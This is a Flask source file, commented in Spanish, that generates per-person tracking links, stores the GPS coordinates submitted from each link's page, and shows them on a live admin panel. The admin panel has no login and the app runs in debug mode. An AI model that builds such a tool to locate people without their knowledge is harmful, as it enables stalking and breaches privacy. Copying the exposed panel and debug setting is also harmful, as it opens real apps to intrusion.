from flask import Flask, request, render_template, jsonify
from flask_socketio import SocketIO
import sqlite3
import uuid

app = Flask(__name__)
socketio = SocketIO(app)

# Configuración de la base de datos SQLite
DB_PATH = "data/tracker.db"

# Inicializar la base de datos SQLite
def init_db():
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                person_id TEXT NOT NULL,
                method TEXT NOT NULL,
                latitude REAL,
                longitude REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS tracking_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                person_id TEXT NOT NULL,
                tracking_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

init_db()

@app.route('/admin')
def admin_panel():
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT t.person_id, t.tracking_url, l.latitude, l.longitude, l.timestamp
            FROM tracking_links t
            LEFT JOIN locations l ON t.person_id = l.person_id
            ORDER BY t.created_at DESC
        ''')
        links = cursor.fetchall()

    return render_template("admin.html", links=links)

@app.route('/generate', methods=['POST'])
def generate_url():
    person_id = str(uuid.uuid4())
    tracking_url = f"https://your-domain.com/track/{person_id}"
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO tracking_links (person_id, tracking_url)
            VALUES (?, ?)
        ''', (person_id, tracking_url))
        conn.commit()

    # Emitir evento para actualizar el panel en tiempo real
    socketio.emit('new_link', {'person_id': person_id, 'tracking_url': tracking_url})
    return jsonify({"tracking_url": tracking_url})

@app.route('/track/<person_id>', methods=['GET'])
def track_page(person_id):
    return render_template("track.html", person_id=person_id)

@app.route('/track/<person_id>/submit', methods=['POST'])
def track(person_id):
    data = request.json

    # Rastrear únicamente por GPS (latitud y longitud enviadas desde el cliente)
    if 'latitude' in data and 'longitude' in data:
        gps_location = {
            "latitude": data['latitude'],
            "longitude": data['longitude']
        }
        save_location(person_id, "gps", gps_location)
        return jsonify({"method": "gps", "location": gps_location})

    return jsonify({"error": "Missing GPS coordinates"}), 400

# Guardar ubicación en SQLite y emitir evento
def save_location(person_id, method, location_data):
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO locations (person_id, method, latitude, longitude)
            VALUES (?, ?, ?, ?)
        ''', (
            person_id,
            method,
            location_data.get("latitude"),
            location_data.get("longitude")
        ))
        conn.commit()

    # Emitir evento para actualizar el panel en tiempo real
    socketio.emit('location_update', {
        "person_id": person_id,
        "method": method,
        **location_data
    })

if __name__ == '__main__':
    socketio.run(app, debug=True)
